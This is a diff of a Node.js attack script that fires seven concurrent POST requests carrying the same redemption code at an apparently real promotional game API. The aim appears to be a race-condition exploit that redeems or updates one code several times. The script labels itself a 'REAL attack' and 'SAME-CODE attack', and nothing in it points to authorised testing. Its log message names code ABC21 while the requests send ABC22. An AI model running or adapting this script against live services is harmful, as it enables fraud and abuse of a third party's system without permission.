@@ -1,22 +1,24 @@
 const axios = require('axios');
 
 const TARGET_URL = 'https://fahasa-game.cdp.vn/api/update';
-// const TARGET_URL = 'https://fahasa-game.cdp.vn/api/update';
-const CODES = ['ABC21', 'ABC22', 'ABC23', 'ABC24', 'ABC25', 'ABC26', 'ABC27'];
+// Single code, multiple requests
+const CODES = Array(7).fill('ABC22'); 
 
 async function attack() {
-    console.log(`🚀 Starting REAL attack on ${TARGET_URL} with codes: ${CODES.join(', ')}`);
+    console.log(`🚀 Starting SAME-CODE attack on ${TARGET_URL} with 7x ABC21`);
     
-    // Tạo 3 request đồng thời
-    const requests = CODES.map(code => {
+    // Tạo request đồng thời
+    const requests = CODES.map((code, index) => {
         return axios.post(TARGET_URL, {
             code: code,
             status: 'PLAYER'
         }).then(res => ({
+            id: index,
             code,
             status: res.status,
             data: res.data
         })).catch(err => ({
+            id: index,
             code,
             status: err.response?.status || 'network_error',
             error: err.response?.data || err.message
@@ -27,7 +29,7 @@ async function attack() {
     
     console.log('📊 Attack Results:');
     results.forEach(r => {
-        console.log(`[${r.code}] Status: ${r.status}`);
+        console.log(`[Req #${r.id}] Status: ${r.status}`);
         if (r.data) console.log(`   Success Data:`, JSON.stringify(r.data));
         if (r.error) console.log(`   Error:`, JSON.stringify(r.error));
     });
